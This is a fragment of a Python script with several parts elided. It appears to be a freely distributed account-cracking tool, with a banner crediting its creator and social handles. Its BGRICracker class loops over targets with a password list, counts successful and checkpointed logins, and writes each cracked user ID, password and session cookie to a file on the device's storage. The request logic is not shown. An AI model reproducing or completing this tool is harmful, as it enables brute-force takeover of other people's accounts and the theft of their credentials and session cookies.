...
\x1b[1;96m   ➤ \x1b[1;92mCreator        : \x1b[1;97mAhmed Gujjar
\x1b[1;96m   ➤ \x1b[1;92mTool           : \x1b[1;97mFree
\x1b[1;96m   ➤ \x1b[1;92mVersion        : \x1b[1;97m1.1
\x1b[1;96m   ➤ \x1b[1;92mTelegram       : \x1b[1;97mAhmed Gujjar
\x1b[1;96m   ➤ \x1b[1;92mFacebook       : \x1b[1;97mAhmed Gujjar
\x1b[1;92m─────────────────────────────"""
...
class BGRICracker:
    ...
    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.G}[AADI] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()
    ...
    def handle_success(self, uid, password, response):
        ...
        with open('/sdcard/AADI-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f"\r  {self.color.Y}\x1b[1;96m   ➤ AKG OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}")
        with open('/sdcard/AADI-OLD.txt', 'a') as f:
